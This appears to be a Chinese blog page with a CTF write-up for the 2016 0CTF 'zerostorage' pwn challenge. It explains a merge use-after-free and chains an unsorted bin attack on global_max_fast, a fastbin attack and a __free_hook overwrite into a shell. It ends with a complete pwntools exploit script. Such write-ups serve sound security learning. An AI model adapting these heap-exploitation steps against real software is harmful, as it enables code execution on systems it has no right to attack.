@@ -1,0 +1,441 @@
+<!DOCTYPE html>
+
+
+  <html class="light page-post">
+
+
+<head>
+  <meta charset="utf-8">
+  
+  <title>2016 0CTF zerostorage | V1NKe的心情垃圾桶</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="PWN," />
+  
+
+  <meta name="description" content="Unsorted Bin Attack">
+<meta name="keywords" content="PWN">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2016 0CTF zerostorage">
+<meta property="og:url" content="http://yoursite.com/2018/09/26/2016 0CTF zerostorage/index.html">
+<meta property="og:site_name" content="V1NKe的心情垃圾桶">
+<meta property="og:description" content="Unsorted Bin Attack">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2018-09-26T11:41:26.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="2016 0CTF zerostorage">
+<meta name="twitter:description" content="Unsorted Bin Attack">
+
+  
+
+  
+    <link rel="icon" href="/haimian.ico">
+  
+
+  <link href="/css/styles.css?v=c114cbe6" rel="stylesheet">
+
+
+  
+    <link rel="stylesheet" href="/css/personal-style.css">
+  
+
+  
+
+  
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?57e94d016e201fba3603a8a2b0263af0";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+  
+  <script type="text/javascript">
+	(function(){
+	    var bp = document.createElement('script');
+	    var curProtocol = window.location.protocol.split(':')[0];
+	    if (curProtocol === 'https') {
+	        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+	    }
+	    else {
+	        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+	    }
+	    var s = document.getElementsByTagName("script")[0];
+	    s.parentNode.insertBefore(bp, s);
+	})();
+  </script>
+
+
+
+  
+    <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  
+
+  
+    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
+  
+</head>
+
+<body>
+
+
+  
+    <span id="toolbox-mobile" class="toolbox-mobile">盒子</span>
+  
+
+  <div class="post-header CENTER">
+   
+  <div class="toolbox">
+    <a class="toolbox-entry" href="/">
+      <span class="toolbox-entry-text">盒子</span>
+      <i class="icon-angle-down"></i>
+      <i class="icon-home"></i>
+    </a>
+    <ul class="list-toolbox">
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/archives/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            博客
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/tag/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            标签
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/link/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            友链
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/about/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            关于
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+
+
+</div>
+
+
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#简介-："><span class="toc-text">简介 ：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#详解-："><span class="toc-text">详解 ：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#思路-："><span class="toc-text">思路 ：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP-："><span class="toc-text">EXP ：</span></a></li></ol>
+  </div>
+
+
+
+<div class="content content-post CENTER">
+   <article id="post-2016 0CTF zerostorage" class="article article-type-post" itemprop="blogPost">
+  <header class="article-header">
+    <h1 class="post-title">2016 0CTF zerostorage</h1>
+
+    <div class="article-meta">
+      <span>
+        <i class="icon-calendar"></i>
+        <span>2018.09.26</span>
+      </span>
+
+      
+        <span class="article-author">
+          <i class="icon-user"></i>
+          <span>V1NKe</span>
+        </span>
+      
+
+      
+
+
+      
+
+      
+      <i class="fa fa-eye"></i> 
+        <span id="busuanzi_container_page_pv">
+           &nbsp热度 <span id="busuanzi_value_page_pv">
+           <i class="fa fa-spinner fa-spin"></i></span>℃
+        </span>
+      
+      
+    </div>
+  </header>
+
+  <div class="article-content">
+    
+      <h2 id="简介-："><a href="#简介-：" class="headerlink" title="简介 ："></a>简介 ：</h2><p>这题目之前就做完了。。因为中秋实在是太懒了。一直没有写文章，今天好好悔过，忏悔一下，重新做了一遍，现在开始写。这题接着上一题的unsortbin attack。</p>
+<h2 id="详解-："><a href="#详解-：" class="headerlink" title="详解 ："></a>详解 ：</h2><p>checksec：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">➜  zerostorage checksec ./zerostorage </span><br><span class="line">[*] &apos;/home/parallels/Desktop/PWN/PwnWiKi/heap/zerostorage/zerostorage&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure>
+<p>全开了。</p>
+<p>分析一下程序功能：</p>
+<p>bss段存了三个部分：</p>
+<ol>
+<li>申请堆块个数计数</li>
+<li>随机数</li>
+<li>堆块结构体 ：固定数字1（表示正在使用），申请大小，申请到的地址和随机数异或后得到的地址。这三部分构成了堆块的结构体。</li>
+</ol>
+<p><strong>insert :</strong></p>
+<ol>
+<li>逐一查看 chunk_struct 数组，查找第一个未使用的元素，但是这个数组最大也就是32。</li>
+<li>读取 chunk 元素所需要存储内容的长度。<ul>
+<li>如果长度不大于0，直接退出；</li>
+<li>否则如果申请的字节数小于128，那就设置为128；</li>
+<li>否则，如果申请的字节数不大于4096，那就设置为对应的数值；</li>
+<li>否则，设置为4096。</li>
+</ul>
+</li>
+<li>使用 calloc 分配指定长度，注意 calloc 会初始化 chunk 为0。</li>
+<li>将 calloc 分配的内存地址与 bss 段的随机数进行抑或，得到一个新的内存地址。</li>
+<li>根据读取的chunk的大小来读入内容。</li>
+<li>将对应的chunk的大小以及存储内容的地址保存到对应的chunk_struct元素中，并标记该元素处于可用状态。<strong>但是，需要注意的是，这里记录的storage的大小是自己输入的大小！！！</strong></li>
+<li>递增num的数量。</li>
+</ol>
+<p><strong>update :</strong></p>
+<ol>
+<li><p>如果没有任何存储，就直接返回。</p>
+</li>
+<li><p>读入要更新的chunk_struct元素的id，如果id大于31或者目前处于不处于使用状态，说明不对，直接返回。</p>
+</li>
+<li><p>读取</p>
+<p>更新后</p>
+<p>chunk所需要存储内容的长度。</p>
+<ul>
+<li>如果长度不大于0，直接退出；</li>
+<li>否则如果申请的字节数小于128，那就设置为128；</li>
+<li>否则，如果申请的字节数不大于4096，那就设置为对应的数值；</li>
+<li>否则，设置为4096。</li>
+</ul>
+</li>
+<li><p>根据 bss 段对应的随机数获取原先chunk存储内容的地址，</p>
+</li>
+<li><p>如果更新后所需的长度不等于更新前的长度，就使用realloc为其重新分配内存。</p>
+</li>
+<li><p>再次读取数据，同时更新chunk_struct元素。</p>
+</li>
+</ol>
+<p><strong>merge :</strong></p>
+<ol>
+<li>如果正在使用的元素不大于1个，那么无法合并，直接退出即可。</li>
+<li>判断chunk_struct是否已经满了，如果不满，找出空闲的那一块。</li>
+<li>分别读取merge_from的id以及merge_to的id号，并进行相应大小以及使用状态的检测。</li>
+<li>根据最初用户输入的大小来计算两个 merge 到一起后所需要的空间，<strong>如果不大于128，那就不会申请新的空间</strong>，否则就申请相应大小的新的空间。</li>
+<li>依次将merge_to与merge_from的内容拷贝到相对应的位置。</li>
+<li><strong>最后存储merge_from内容的内存地址被释放了，但并没有被置为NULL。同时，存放merge_to内容的内存地址并没有被释放，相应的storage的抑或后的地址只是被置为了NULL。</strong></li>
+<li><strong>但是需要注意的是，，在merge的时候，并没有检测两个storage的ID是否相同。</strong></li>
+</ol>
+<p>最重要的也就是上面三个功能了，后面的delete，view，list都是普通的功能。</p>
+<h3 id="思路-："><a href="#思路-：" class="headerlink" title="思路 ："></a>思路 ：</h3><ol>
+<li><p>程序读入了from ID与to ID后，完成一个合并的操作，然后将from ID指向的那个堆内存free。那么如果merge时输入的2个ID相同，在完成合并后那块内容指向的chunk将被free，但是我们依然可以读写那块chunk，造成use after free.之后直接view这块内容，即可leak出libc的地址。</p>
+</li>
+<li><p>在上述操作后，chunk被放入unsorted bin中，此时如果修改这个chunk的bk指针并重新malloc这个chunk，就能触发unsortedbin attack。进而去修改global_max_fast的值。这个变量用于控制最大的Fast chunk的大小，将这里改写为unsorted bin的地址(一般来说是一个很大的正数)，就能使之后的chunk都被当作fast chunk，即可进行Fast bin attack。</p>
+</li>
+<li><p>由于unsorted bin在改写操作后即被破坏，我们需要事先布置好内存的布局。在改写global_max_fast之后，我们再进行一次merge的操作，这次chunk将进入’Fast bin’(实际它的index并不在正常的Fast bin数组内，但没有关系)，然后改写fd指针指向程序管理内容的数组，我们需要事先在数组上insert一个大小为144的块作为Fast chunk的size以通过检查，然后将fd指到这里。</p>
+<p>之后下下次的malloc即可取得程序bss上的指针，注意分配过来的时候需要读入对应的大小，我们需要故意让这段区域跨过这个块自己，因为程序在读入数据之后还会将其元数据回填，这样我们就能通过view来得到异或之后的地址，随即计算出key的值。然后update这个块，修改某一个指针为realloc_hook的地址异或key的值，接着update对应的块，将system的地址填入realloc_hook。最后扩大事先布置好的存有<code>/bin/sh</code>的块，即可得到shell。</p>
+</li>
+</ol>
+<p>这里我们也可以覆盖修改free_hook等等的值。</p>
+<p>还有一个注意点：</p>
+<p>由于本机是ubuntu16，但是程序开了PIE，且在ubuntu16中libc基址和程序基址不存在固定的偏移，所以该程序在本机中只有在关闭了aslr的情况下才能够getshell。</p>
+<p>详细的就不说了，仔细查看exp。</p>
+<h2 id="EXP-："><a href="#EXP-：" class="headerlink" title="EXP ："></a>EXP ：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&apos;./zerostorage&apos;)</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">libc = ELF(&apos;./libc.so&apos;)</span><br><span class="line"></span><br><span class="line">def insert(length, data=&apos;&apos;):</span><br><span class="line">    data = data.ljust(length, &apos;A&apos;)</span><br><span class="line">    p.recvuntil(&apos;Your choice: &apos;)</span><br><span class="line">    p.sendline(&apos;1&apos;)</span><br><span class="line">    p.sendline(str(length))</span><br><span class="line">    p.send(data)</span><br><span class="line"></span><br><span class="line">def update(idx, length, data=&apos;&apos;):</span><br><span class="line">    data = data.ljust(length, &apos;B&apos;)</span><br><span class="line">    p.recvuntil(&apos;Your choice: &apos;)</span><br><span class="line">    p.sendline(&apos;2&apos;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.sendline(str(length))</span><br><span class="line">    p.send(data)</span><br><span class="line"></span><br><span class="line">def merge(fro, to):</span><br><span class="line">    p.recvuntil(&apos;Your choice: &apos;)</span><br><span class="line">    p.sendline(&apos;3&apos;)</span><br><span class="line">    p.sendline(str(fro))</span><br><span class="line">    p.sendline(str(to))</span><br><span class="line"></span><br><span class="line">def delete(idx):</span><br><span class="line">    p.recvuntil(&apos;Your choice: &apos;)</span><br><span class="line">    p.sendline(&apos;4&apos;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">def view(idx):</span><br><span class="line">    p.recvuntil(&apos;Your choice: &apos;)</span><br><span class="line">    p.sendline(&apos;5&apos;)</span><br><span class="line">    p.recvuntil(&apos;Entry ID: &apos;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">elf_base = 0x555555554000</span><br><span class="line"></span><br><span class="line">insert(0x8) #0 merge</span><br><span class="line">insert(0x90,&apos;/bin/sh;&apos;) #1</span><br><span class="line">insert(0x8) #2</span><br><span class="line">insert(0x90) #3 fake bss chunk</span><br><span class="line">insert(0x80) #4 avoid top chunk</span><br><span class="line"></span><br><span class="line">merge(0,0) #5</span><br><span class="line">view(5)</span><br><span class="line"></span><br><span class="line"># leak libc</span><br><span class="line">p.recvuntil(&apos;Entry No.5:\n&apos;)</span><br><span class="line">data = u64(p.recv(6).ljust(8,&apos;\x00&apos;))</span><br><span class="line">log.success(&apos;leak main_area :&apos;+hex(data))</span><br><span class="line">libc_base = data - 0x3c4b78</span><br><span class="line">global_max_fast = libc_base + 0x3c67f8</span><br><span class="line">realloc_addr = libc_base + libc.symbols[&apos;__realloc_hook&apos;]</span><br><span class="line">system_addr = libc_base + libc.symbols[&apos;system&apos;]</span><br><span class="line">free_addr = libc_base + libc.symbols[&apos;__free_hook&apos;]</span><br><span class="line"></span><br><span class="line"># unsortbin attack</span><br><span class="line">payload = p64(global_max_fast - 0x10)*2</span><br><span class="line">update(5,len(payload),payload)</span><br><span class="line">insert(0x8) #0</span><br><span class="line"></span><br><span class="line"># fastbin attack</span><br><span class="line">merge(2,2) #6</span><br><span class="line">payload2 = p64(elf_base + 0x203060 + 0x18 + 0x18 + 0x18)</span><br><span class="line">update(6,len(payload2),payload2)</span><br><span class="line">insert(0x8) #2</span><br><span class="line">insert(0x88,&apos;A&apos;*0x50+p64(0x0)) #7</span><br><span class="line"></span><br><span class="line"># leak after xor num --&gt; get xor num</span><br><span class="line">view(7)</span><br><span class="line">p.recvuntil(&apos;\x88\x00\x00\x00\x00\x00\x00\x00&apos;)</span><br><span class="line">data2 = u64(p.recv(8))</span><br><span class="line">log.success(&apos;leak xor :&apos;+hex(data2))</span><br><span class="line">xor_num = data2^0x5555557570b8</span><br><span class="line">log.success(&apos;xor num :&apos;+hex(xor_num))</span><br><span class="line"></span><br><span class="line"># change free_hook --&gt; system</span><br><span class="line">payload3 = p64(free_addr^xor_num)</span><br><span class="line">update(7,0x88,payload3)</span><br><span class="line"></span><br><span class="line">payload4 = p64(system_addr)</span><br><span class="line">update(3,0x90,payload4)</span><br><span class="line"></span><br><span class="line">delete(1)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+    
+  </div>
+
+  
+      <div class="git"></div>
+  
+
+</article>
+
+
+   
+  <div class="text-center donation">
+    <div class="inner-donation">
+      <span class="btn-donation">支持一下</span>
+      <div class="donation-body">
+        <div class="tip text-center">扫一扫，支持v1nke</div>
+        <ul>
+        
+          <li class="item">
+            <span>微信扫一扫</span>
+            <img src="/images/qr-wechat.jpeg" alt="">
+          </li>
+        
+          <li class="item">
+            <span>支付宝扫一扫</span>
+            <img src="/images/qr-wechat.jpeg" alt="">
+          </li>
+        
+        </ul>
+      </div>
+    </div>
+  </div>
+
+
+   
+  <div class="box-prev-next clearfix">
+    <a class="show pull-left" href="/2018/09/19/HITCON Training lab14 magic heap/">
+        <i class="icon icon-angle-left"></i>
+    </a>
+    <a class="show pull-right" href="/2098/03/09/V1NKe's Diary/">
+        <i class="icon icon-angle-right"></i>
+    </a>
+  </div>
+
+
+
+
+</div>
+
+
+  <a id="backTop" class="back-top">
+    <i class="icon-angle-up"></i>
+  </a>
+
+
+
+
+  <div class="modal" id="modal">
+  <span id="cover" class="cover hide"></span>
+  <div id="modal-dialog" class="modal-dialog hide-dialog">
+    <div class="modal-header">
+      <span id="close" class="btn-close">关闭</span>
+    </div>
+    <hr>
+    <div class="modal-body">
+      <ul class="list-toolbox">
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/archives/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              博客
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/tag/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              标签
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/link/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              友链
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/about/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              关于
+            </a>
+          </li>
+        
+      </ul>
+
+    </div>
+  </div>
+</div>
+
+
+
+  
+      <div class="fexo-comments comments-post">
+    
+
+    
+    
+
+    
+    
+
+    
+
+    
+    
+
+  </div>
+
+  
+
+  <script type="text/javascript">
+  function loadScript(url, callback) {
+    var script = document.createElement('script')
+    script.type = 'text/javascript';
+
+    if (script.readyState) { //IE
+      script.onreadystatechange = function() {
+        if (script.readyState == 'loaded' ||
+          script.readyState == 'complete') {
+          script.onreadystatechange = null;
+          callback();
+        }
+      };
+    } else { //Others
+      script.onload = function() {
+        callback();
+      };
+    }
+
+    script.src = url;
+    document.getElementsByTagName('head')[0].appendChild(script);
+  }
+
+  window.onload = function() {
+    loadScript('/js/bundle.js?235683', function() {
+      // load success
+    });
+  }
+</script>
+
+</body>
+</html>
